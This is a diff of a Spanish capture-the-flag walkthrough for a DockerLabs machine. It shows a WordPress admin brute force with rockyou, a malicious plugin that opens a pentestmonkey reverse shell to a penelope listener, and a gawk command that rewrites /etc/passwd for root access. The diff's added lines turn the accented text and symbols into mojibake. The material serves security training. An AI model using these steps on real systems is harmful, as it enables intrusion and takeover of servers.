@@ -4,7 +4,7 @@ Plataforma: DockerLabs
 SO: Linux
 Dificultad: Medio
 VectorInicial: WordPress brute force (admin:rockyou) + subida plugin malicioso
-Privesc: SUID gawk → modificación /etc/passwd
+Privesc: SUID gawk ÔåÆ modificaci├│n /etc/passwd
 Fecha: 2026-02-18
 ---
 <img width="918" height="516" alt="Pasted image 20260217124550" src="https://github.com/user-attachments/assets/76afc7f1-689f-48fe-9a86-5249734c2675" />
@@ -12,8 +12,8 @@ Fecha: 2026-02-18
 Empezaremos con un reconocimiento de la superficie para que encontramos.
 
 ```bash
- gomap -s $TARGET
-🎯 Scanning 192.168.1.100 (997 ports)
+¯é░ gomap -s $TARGET
+­ƒÄ» Scanning 192.168.1.100 (997 ports)
 
 PORT    STATE  SERVICE         VERSION
 80      open   http            Apache 2.4.58 (Ubuntu)
@@ -21,15 +21,15 @@ PORT    STATE  SERVICE         VERSION
 Host Exposure Summary
 - 192.168.1.100 | open ports: 1 | critical: none | exposure: low
 
-✓ Completed scan in 27ms | hosts: 1 | open ports: 1
+Ô£ô Completed scan in 27ms | hosts: 1 | open ports: 1
 ```
 
 Como solo tiene un puerto abierto nos dirigimos a la web para ver que encontramos.
 
-Solo hay un botón con un error, pero esto es raro, así que procedemos a realizar una enumeración de directorios.
+Solo hay un bot├│n con un error, pero esto es raro, as├¡ que procedemos a realizar una enumeraci├│n de directorios.
 
 ```bash
- gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
+¯é░ gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 ===============================================================
 Gobuster v3.8.2
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -54,12 +54,12 @@ Finished
 ===============================================================
 ```
 
-Vemos que tenemos un **Wordpress** y un **PhpMyAdmin**, así que empezaremos por navegar al *Wordpress*.
+Vemos que tenemos un **Wordpress** y un **PhpMyAdmin**, as├¡ que empezaremos por navegar al *Wordpress*.
 
-Pero nos redirige a un dominio así que lo indicaremos en */ect/hosts*.
+Pero nos redirige a un dominio as├¡ que lo indicaremos en */ect/hosts*.
 
 ```bash
- sudo nano /etc/hosts
+¯é░ sudo nano /etc/hosts
 
 127.0.0.1       localhost
 127.0.1.1       jd-sec.intracof.local   jd-sec
@@ -72,10 +72,10 @@ ff02::2 ip6-allrouters
 192.168.1.100 escolares.dl
 ```
 
-Encontramos la web de un guitarrista y procedemos a la enumeración visual de la web y posteriormente desde *wpscan*.
+Encontramos la web de un guitarrista y procedemos a la enumeraci├│n visual de la web y posteriormente desde *wpscan*.
 
 ```bash
- wpscan --url http://escolares.dl/wordpress/ -e u,p
+¯é░ wpscan --url http://escolares.dl/wordpress/ -e u,p
 ```
 
 Visualmente no encontramos nada interesante, pero desde *wpscan encontramos*.
@@ -84,7 +84,7 @@ Visualmente no encontramos nada interesante, pero desde *wpscan encontramos*.
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
-          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ┬«
            \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
             \  /\  /  | |     ____) | (__| (_| | | | |
              \/  \/   |_|    |_____/ \___|\__,_|_| |_|
@@ -219,12 +219,12 @@ Lo interesante de estos plugins son las vulnerabilidades:
 - elementor
 	- Admin+ Arbitrary File Read via Image Import
 
-Buscamos información para ver cual de los 2 puede ser mas interesante.
+Buscamos informaci├│n para ver cual de los 2 puede ser mas interesante.
 
-Descubrimos que necesitamos al menos privilegios de autor o admin, así que vamos a probar a realizar un ataque de diccionario contra el usuario *admin* y encontrar su clave de acceso.
+Descubrimos que necesitamos al menos privilegios de autor o admin, as├¡ que vamos a probar a realizar un ataque de diccionario contra el usuario *admin* y encontrar su clave de acceso.
 
 ```bashh
- wpscan --url http://escolares.dl/wordpress/ -U admin -P /usr/share/wordlists/rockyou.txt
+¯é░ wpscan --url http://escolares.dl/wordpress/ -U admin -P /usr/share/wordlists/rockyou.txt
 
 <skip>
 
@@ -234,22 +234,22 @@ Descubrimos que necesitamos al menos privilegios de autor o admin, así que vamo
 <skip>
 ```
 
-Ya con los credenciales iniciaremos sesión y nos dirigiremos a los plugins vulnerables.
+Ya con los credenciales iniciaremos sesi├│n y nos dirigiremos a los plugins vulnerables.
 
-Cabe recordar que no es necesario el uso de las vulnerabilidades puesto que tenemos la opción de usar el editor de themes para inyectar código y conseguir un revershell.
+Cabe recordar que no es necesario el uso de las vulnerabilidades puesto que tenemos la opci├│n de usar el editor de themes para inyectar c├│digo y conseguir un revershell.
 
 <img width="1903" height="847" alt="Pasted image 20260217170840" src="https://github.com/user-attachments/assets/68aa3290-e425-4185-8ee2-5ec05588114c" />
 
-Pero como la finalidad de este laboratorio es la explotación de los plugin procederemos con los mismos.
+Pero como la finalidad de este laboratorio es la explotaci├│n de los plugin procederemos con los mismos.
 
-Primero usaremos un método de subida de un plugin malicioso, así que crearemos un fichero **PHP** con un revershell de pentestmonkey y luego lo comprimiremos en formato *zip* para poder subirlo a la web.
+Primero usaremos un m├®todo de subida de un plugin malicioso, as├¡ que crearemos un fichero **PHP** con un revershell de pentestmonkey y luego lo comprimiremos en formato *zip* para poder subirlo a la web.
 
 No olvidar que al principio del fichero hay  que indicar unos datos para que reconozca que es un plugin.
 
 ```php
 /*
 Plugin Name: Revershell PentestMonkey
-Description: Ejecución de conexión remota hacia atacante
+Description: Ejecuci├│n de conexi├│n remota hacia atacante
 Version: 1.0
 Author: NexusFireMan
 License: GPL2
@@ -257,17 +257,17 @@ License: GPL2
 ```
 
 ```bash
- nano shell.php
+¯é░ nano shell.php
 
- 7z a ./shell.zip ./shell.php
+¯é░ 7z a ./shell.zip ./shell.php
 ```
 
-Ahora que tenemos el **zip** creado nos pondremos a la escucha con *penelope* para después subir el plugin y al activarlo conseguir un reversehell.
+Ahora que tenemos el **zip** creado nos pondremos a la escucha con *penelope* para despu├®s subir el plugin y al activarlo conseguir un reversehell.
 
 ```bash
- penelope -p 443
-[+] Listening for reverse shells on 0.0.0.0:443 →  127.0.0.1 • 10.0.11.11 • 172.17.0.1 • 192.168.1.1
-➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+¯é░ penelope -p 443
+[+] Listening for reverse shells on 0.0.0.0:443 ÔåÆ  127.0.0.1 ÔÇó 10.0.11.11 ÔÇó 172.17.0.1 ÔÇó 192.168.1.1
+Ô×ñ  ­ƒÅá Main Menu (m) ­ƒÆÇ Payloads (p) ­ƒöä Clear (Ctrl-L) ­ƒÜ½ Quit (q/Ctrl-C)
 ```
 
 <img width="1503" height="719" alt="Pasted image 20260218091957" src="https://github.com/user-attachments/assets/e77c5e9c-4139-4134-a44c-04d2c5f29edd" />
@@ -275,12 +275,12 @@ Ahora que tenemos el **zip** creado nos pondremos a la escucha con *penelope* pa
 Una vez activo el plugin obtendremos una revershell y estaremos dentro del servidor.
 
 ```bash
-[+] Got reverse shell from 07ea20f65d0d~192.168.1.100-Linux-x86_64 😍️ Assigned SessionID <1>
+[+] Got reverse shell from 07ea20f65d0d~192.168.1.100-Linux-x86_64 ­ƒÿì´©Å Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
-[+] Shell upgraded successfully using /usr/bin/python3! 💪
+[+] Shell upgraded successfully using /usr/bin/python3! ­ƒÆ¬
 [+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
-[+] Logging to /home/jduran/.penelope/sessions/07ea20f65d0d~192.168.1.100-Linux-x86_64/2026_02_18-09_40_47-986.log 📜
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+[+] Logging to /home/jduran/.penelope/sessions/07ea20f65d0d~192.168.1.100-Linux-x86_64/2026_02_18-09_40_47-986.log ­ƒô£
+ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
 www-data@07ea20f65d0d:/$ whoami
 www-data
 www-data@07ea20f65d0d:/$ ls
@@ -289,21 +289,21 @@ bin.usr-is-merged  dev	home  lib.usr-is-merged  media  opt  root  sbin  srv		   
 www-data@07ea20f65d0d:/$ 
 ```
 
-Ahora toca la escalada de privilegios, así que empezaremos a buscar vectores.
+Ahora toca la escalada de privilegios, as├¡ que empezaremos a buscar vectores.
 
 ```bash
 www-data@07ea20f65d0d:/$ sudo -l
 [sudo] password for www-data:
 ```
 
-Al intentar ver a que tenemos permiso nos encontramos con una barrera, pero vamos a ver si el usuario **admin** existe en el sistema por si reutilizara la misma contraseña que en la web.
+Al intentar ver a que tenemos permiso nos encontramos con una barrera, pero vamos a ver si el usuario **admin** existe en el sistema por si reutilizara la misma contrase├▒a que en la web.
 
 ```bash
 www-data@07ea20f65d0d:/$ ls /home/
 ubuntu
 ```
 
-Vemos que este usuario no es el mismo y no nos sirve, intentemos buscar a ver si existe algún *SUID* y podemos aprovecharlo.
+Vemos que este usuario no es el mismo y no nos sirve, intentemos buscar a ver si existe alg├║n *SUID* y podemos aprovecharlo.
 
 ```bash
 www-data@07ea20f65d0d:/$ find . -perm -4000 2>/dev/null 
@@ -327,7 +327,7 @@ Ahora solo nos queda buscar en *gtfobins* para realizar la escalada desde *gawk*
 gawk 'BEGIN {system("/bin/sh")}'
 ```
 
-Pero esto solo abre una consola en modo *sh* de nuestro usuario así que indagamos mas y nos encontramos con una utilidad de este comando.
+Pero esto solo abre una consola en modo *sh* de nuestro usuario as├¡ que indagamos mas y nos encontramos con una utilidad de este comando.
 
 ```bash
 www-data@2a7ff2dd9abe:/$ /usr/bin/gawk -F 'x' '{print $1 $NF > "/etc/passwd"}' /etc/passwd
@@ -343,9 +343,9 @@ root@2a7ff2dd9abe:/#
 
 Con este comando hemos podido quitar la **X** al usuario *root* y podemos hacer uso del comando *su* para escalar privilegios.
 
-Ademas en la carpeta */tmp* nos encontramos un fichero curioso con una contraseña cifrada en *base64*.
+Ademas en la carpeta */tmp* nos encontramos un fichero curioso con una contrase├▒a cifrada en *base64*.
 
-Esta contraseña seguramente sea del usuario *ubuntu* o del *root* pero como ya tenemos la escalada lo dejaremos estar.
+Esta contrase├▒a seguramente sea del usuario *ubuntu* o del *root* pero como ya tenemos la escalada lo dejaremos estar.
 
 ---
 Si te gusto puedes invitarme a un cafe.
